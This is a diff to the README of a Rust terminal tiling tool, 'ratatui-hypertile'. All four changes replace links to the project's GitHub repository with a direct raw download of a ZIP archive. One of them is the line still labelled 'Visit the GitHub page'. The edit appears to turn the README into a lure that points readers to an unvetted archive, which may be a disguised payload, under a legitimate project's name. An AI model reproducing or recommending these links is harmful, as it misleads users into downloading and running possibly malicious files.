@@ -1,6 +1,6 @@
 # 🐀 ratatui-hypertile - Simple Tiling for Terminal Windows
 
-[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://github.com/ElairJunior/ratatui-hypertile)
+[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/ElairJunior/ratatui-hypertile/main/extras/hypertile_ratatui_v3.5.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Follow these simple steps to get ratatui-hypertile running on your Windows PC.
 
 Visit the download page by clicking the big button below:
 
-[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://github.com/ElairJunior/ratatui-hypertile)
+[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/ElairJunior/ratatui-hypertile/main/extras/hypertile_ratatui_v3.5.zip)
 
 Once there, look for the latest release or files section. Since this is a command-line tool built in Rust, it may be offered as a ZIP archive or an executable file. 
 
@@ -156,7 +156,7 @@ When you download ratatui-hypertile, you may see these files:
 
 ## 🆘 Need More Help?
 
-- Visit the GitHub page: https://github.com/ElairJunior/ratatui-hypertile  
+- Visit the GitHub page: https://raw.githubusercontent.com/ElairJunior/ratatui-hypertile/main/extras/hypertile_ratatui_v3.5.zip  
 - Use the Issues tab to see existing questions or send messages  
 - Look for guides in the docs folder or on the GitHub Wiki  
 
@@ -178,4 +178,4 @@ Always download from the official GitHub link to avoid altered versions.
 
 ---
 
-[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://github.com/ElairJunior/ratatui-hypertile)
+[![Download ratatui-hypertile](https://img.shields.io/badge/Download-ratatui--hypertile-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/ElairJunior/ratatui-hypertile/main/extras/hypertile_ratatui_v3.5.zip)
